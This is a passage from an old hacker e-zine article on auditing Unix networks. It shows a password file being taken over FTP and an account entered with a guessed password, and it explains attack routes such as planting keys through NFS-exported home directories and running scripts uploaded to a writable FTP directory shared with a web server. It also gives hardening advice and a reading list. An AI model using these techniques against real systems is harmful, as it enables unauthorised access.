+Ok, grabbing the password file isnt so steathly.  But I want to check to see if
+they screwed up at all.
+
+$> tail -n1 passwd ftpadm:x:1113:1000::/home/ftpadm:/bin/csh
+
+Yes, they have screwed up this is possibly (if the passwd file is not out of
+date) a local user account with a vaild shell.
+
+[muffin /tmp] $ ftp 192.168.41.29
+
+Connected to zig.internal.net.  220 zig FTP server (UNIX(r) System V Release
+4.0) ready.  Name (zig.internal.net:security): ftpadm 331 Password required for
+ftpadm.  Password: (ftpadm1) 230 User ftpadm logged in.  ftp>
+
+First try.  Probably the second worst password you could have besides ftpadm. 
+Dangerous combinations
+
+SSH and NFS, if you are exporting a home directory to the world which is a big
+no-no an attacker can append their identity.pub file in your authorized_keys
+file.  This will allow them to login with their login password.  You really
+shouldnt need to export a file system off of a system on the internet.  I would
+move the NFS server into the internal network and share out the filesystem to s
+specific list of hosts or networks. Also besides clamping down on NFS add tcp
+wrappers to your SSH daemon, it can be run from inetd with sshd's -i option. 
+WWW with telnet/ssh.  Be sure if you list contacts and email addresses that none
+of them reside locally on the web server.  If they do then you just gave out
+half of your password file. A list of contacts is a list of logins.  An
+anonymous ftp site with write able directories and / or sensitive material. This
+is becomes an electronic form of dumpster diving.  Old emails, software
+packages, sensitive files etc..  snmp and samba, snmp can be used to get the
+netbios/machine name.  Then samba can be probed for shares.  Sharing an
+uploadable ftp directory with a webserver. Scripts can be uploaded and executed
+remotely through the webserver. (PHP,ASP,PERL,SHTML etc..) Sorting /
+Organization Logs are normally kept in flat text files, this make them easy to
+manage and sort. Depending on how savvy you are you might want to create
+database or store them in comma delimited format. I organize log files using the
+following directory structure.  Network -----> Hostname -----> nmap_output
+-----> showmount -e output -----> snmpwalk_output ..etc..
+  
+
+I suggest logging problems by network, OS, Vulnerability,hostname.
+
+                                    192.168.0 ------> IRIX
+                                                      ------>
+                                                             open_lp_account
+                                                             192.168.0.23
+                                                             192.168.0.64
+                                                             192.168.0.203
+
+                  This way with each directory change you get more detail.
+  
+  X. Resources
+
+Web.
+
+Security mailing list and announcements http://www.cert.org Massive security
+site, hosts bugtraq and other security forums.  http://www.securityfocus.com
+Probably the biggest security archive out there. http://packetstorm.securify.com
+Underground news and information http://www.hackernews.com A searchable index of
+RFCs, FAQs and electronic books. http://www.faqs.org/ IBM Bookmanager Book
+server. http://www.s390.ibm.com:80/bookmgr-cgi/bookmgr.cmd/print?book=bk8p7001
+The nessus project (free network security scanning tool ) http://www.nessus.org
+nmap OS detecting scanner. http://www.insecure.org
+
+  Papers
+
+Holbrook. P, (1991). Site Security Handbook [Online], Available:
+http://www.cis.ohio-state.edu/htbin/rfc/rfc1244.html [1997, December 20]. 
+Pethia. R, (1991). Guidelines for the Secure Operation of the Internet [Online],
+Available: http://www.cis.ohio-state.edu/htbin/rfc/rfc1281.html [1997, December
+20].
+
+Farmer. D and Venema. W, (No Date). Improving the security of your site by
+breaking into it [Online],
+Available:http://www.deter.com/unix/papers/improve_by_breakin.html [1998,
+January].
+
+Bellovin. S. M, (1993). Packets found on an internet [Online],Available:
+http://www.deter.com/unix/papers/packets_found_bellovin.ps.gz [1998, January].
+
+Bacic. E. M, (No Date). UNIX & Security [Online], Available:
+http://manitou.cse.dnd.ca/papers/Unix_Sec.html [1998, January].
+
+Smith. N. P, (1997). Stack Smashing Vulnerabilities in the UNIX operating system
+[Online], Available:
+http://millcomm.com/~nate/machines/security/stack-smashing/[1998, Febuary]. 
+
+Fydor, (1998) Remote OS detection via TCP/IP Stack Finger Printing [Online],
+Available: http://www.insecure.org/nmap/nmap-fingerprinting-article.html
+ 
++==============================================================================+
+| Get The Latest Issues                                                        |
+|                            Join the Mailing List                             |
+|                            ---------------------                             |
+| E-mail hd-request@hackersdigest.com with the word subscribe in the           |
+| subject line.                                                                |
++==============================================================================+
+                             www.hackersdigest.com
+
+     
+
+ 
